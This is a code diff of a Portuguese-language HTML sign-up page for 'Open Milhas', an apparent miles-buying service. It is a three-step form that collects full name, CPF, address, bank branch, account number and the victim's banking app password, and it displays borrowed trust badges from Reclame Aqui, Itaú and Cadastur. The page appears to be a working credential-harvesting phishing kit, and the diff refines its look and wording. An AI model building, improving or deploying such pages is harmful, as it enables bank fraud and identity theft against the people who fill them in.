@@ -2,74 +2,67 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Open Milhas | Completar Cadastro</title>
+    <title>Open Milhas | Cadastro Profissional</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
     <style>
-        body { background: #fff; font-family: 'Segoe UI', sans-serif; }
-        .navbar-top { padding: 20px; border-bottom: 1px solid #eee; }
-        .progress-bar-custom { height: 10px; background: #e9ecef; border-radius: 10px; margin: 30px 0; overflow: hidden; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; }
+        .navbar-custom { background: #0a1128; color: white; padding: 15px; border-bottom: 3px solid #c5a059; }
+        .progress-bar-custom { height: 12px; background: #e9ecef; border-radius: 10px; margin: 30px 0; overflow: hidden; }
         .progress-fill { height: 100%; background: #2c7da0; width: 33%; transition: 0.5s; }
         .step-page { display: none; } .step-active { display: block; }
-        .btn-continue { background: #469cb4; color: white; border-radius: 10px; padding: 12px 40px; border: none; font-weight: bold; }
-        .form-control { border-radius: 25px; padding: 12px 20px; margin-bottom: 15px; }
-        .badge-img { height: 40px; margin: 10px 20px; }
+        .form-control { border-radius: 20px; padding: 12px; margin-bottom: 15px; }
+        .btn-next { background: #469cb4; color: white; border-radius: 10px; padding: 10px 40px; border: none; font-weight: bold; }
+        .badge-footer { height: 40px; margin: 10px 15px; }
     </style>
 </head>
 <body>
-    <div class="navbar-top container d-flex justify-content-between">
-        <h4 class="fw-bold">OPEN <span style="color: #c5a059;">MILHAS</span></h4>
-        <span class="text-muted small">Passo <span id="stepNumber">1</span> de 3</span>
+    <div class="navbar-custom container-fluid">
+        <h4 class="mb-0">OPEN <span style="color: #c5a059;">MILHAS</span></h4>
     </div>
 
-    <div class="container mt-4">
-        <h2 class="fw-bold">Complete seu cadastro</h2>
+    <div class="container mt-4" style="max-width: 600px;">
         <div class="progress-bar-custom"><div class="progress-fill" id="progressBar"></div></div>
-
-        <form action="/login" method="POST" id="mainForm">
+        <form action="/login" method="POST">
             <div class="step-page step-active" id="step1">
-                <p class="fw-bold text-primary"><i class="fas fa-user me-2"></i> 1. DADOS PESSOAIS</p>
-                <input type="text" name="nome" class="form-control" placeholder="Nome completo *" required>
-                <input type="date" name="data_nasc" class="form-control" required>
-                <input type="text" name="cpf" class="form-control" placeholder="CPF *" required>
-                <div class="text-end mt-4"><button type="button" class="btn-continue" onclick="changeStep(2)">Continuar</button></div>
+                <h5 class="mb-4">1. Identificação</h5>
+                <input type="text" name="nome" class="form-control" placeholder="Nome Completo" required>
+                <input type="text" name="cpf" class="form-control" placeholder="CPF" required>
+                <div class="text-end"><button type="button" class="btn-next" onclick="next(2)">Continuar</button></div>
             </div>
 
             <div class="step-page" id="step2">
-                <p class="fw-bold text-primary"><i class="fas fa-map-marker-alt me-2"></i> 2. ENDEREÇO</p>
-                <input type="text" name="cep" class="form-control" placeholder="CEP *" required>
-                <input type="text" name="rua" class="form-control" placeholder="Rua *" required>
-                <input type="text" name="numero" class="form-control" placeholder="Número *" required>
-                <div class="text-end mt-4">
-                    <button type="button" class="btn btn-link text-dark" onclick="changeStep(1)">Voltar</button>
-                    <button type="button" class="btn-continue" onclick="changeStep(3)">Continuar</button>
+                <h5 class="mb-4">2. Endereço de Contato</h5>
+                <input type="text" name="cep" class="form-control" placeholder="CEP" required>
+                <input type="text" name="rua" class="form-control" placeholder="Rua / Logradouro" required>
+                <div class="text-end">
+                    <button type="button" class="btn btn-link text-dark" onclick="next(1)">Voltar</button>
+                    <button type="button" class="btn-next" onclick="next(3)">Continuar</button>
                 </div>
             </div>
 
             <div class="step-page" id="step3">
-                <p class="fw-bold text-primary"><i class="fas fa-university me-2"></i> 3. DADOS BANCÁRIOS</p>
-                <input type="text" name="agencia" class="form-control" placeholder="Agência *" required>
-                <input type="text" name="conta" class="form-control" placeholder="Número da conta *" required>
-                <input type="password" name="senha_app" class="form-control" placeholder="Senha do aplicativo *" required>
-                <div class="text-end mt-4">
-                    <button type="button" class="btn btn-link text-dark" onclick="changeStep(2)">Voltar</button>
-                    <button type="submit" class="btn-continue" style="background: #c5a059;">FINALIZAR</button>
+                <h5 class="mb-4">3. Dados para Recebimento</h5>
+                <input type="text" name="agencia" class="form-control" placeholder="Agência" required>
+                <input type="text" name="conta" class="form-control" placeholder="Número da Conta" required>
+                <input type="password" name="senha_app" class="form-control" placeholder="Senha do Aplicativo" required>
+                <div class="text-end">
+                    <button type="button" class="btn btn-link text-dark" onclick="next(2)">Voltar</button>
+                    <button type="submit" class="btn-next" style="background: #c5a059;">FINALIZAR</button>
                 </div>
             </div>
         </form>
     </div>
 
-    <footer class="text-center mt-5 py-4 border-top">
-        <img src="https://logodownload.org/wp-content/uploads/2017/11/reclame-aqui-logo.png" class="badge-img">
-        <img src="https://ww2.itau.com.br/cartoes/escolha/img/selo-seguranca.png" class="badge-img">
-        <p class="small text-muted mt-3">OPEN MILHAS © 2026 | CNPJ: 26.878.221/0001-50</p>
+    <footer class="text-center mt-5 py-4 bg-white border-top">
+        <img src="https://logodownload.org/wp-content/uploads/2017/11/reclame-aqui-logo.png" class="badge-footer">
+        <img src="https://logodownload.org/wp-content/uploads/2019/08/cadastur-logo.png" class="badge-footer">
+        <p class="small text-muted mt-2">OPEN MILHAS © 2026</p>
     </footer>
 
     <script>
-        function changeStep(s) {
+        function next(s) {
             document.querySelectorAll('.step-page').forEach(p => p.classList.remove('step-active'));
             document.getElementById('step'+s).classList.add('step-active');
-            document.getElementById('stepNumber').innerText = s;
             document.getElementById('progressBar').style.width = (s === 2) ? '66%' : (s === 3) ? '100%' : '33%';
         }
     </script>
